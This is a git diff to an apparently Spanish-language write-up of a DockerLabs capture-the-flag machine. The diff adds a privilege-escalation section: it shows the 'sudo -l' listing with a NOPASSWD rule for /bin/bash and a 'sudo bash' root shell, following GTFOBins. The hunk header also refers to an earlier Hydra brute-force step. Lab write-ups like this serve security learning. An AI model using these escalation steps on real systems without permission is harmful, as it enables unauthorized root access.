@@ -75,9 +75,23 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 01:23:
 ```
 Ya dentro del usuario vulnerable
 ## 3. 🚀 Escalada de Privilegios
-Revisamos los comandos vuln
+Revisamos los comandos con permisos privilegiados del usuario:
+```bash
+sudo -l
+Matching Defaults entries for borazuwarah on dockerlabs:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
-
+User borazuwarah may run the following commands on dockerlabs:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /bin/bash
+```
+Encontramos el comando bash, buscamos en GTFOBins un comando para explotar el binario con permisos de root:
+```bash
+borazuwarah@dockerlabs:~$ sudo bash
+root@dockerlabs:/home/borazuwarah# whoami
+root
+```
+Obteniendo el acceso al usuario root a través del binario comprometido.
 ## 4. 🚩 Banderas (Flags)
-- **User:** 
-- **Root**: 
+- **User:** N/A
+- **Root**: N/A
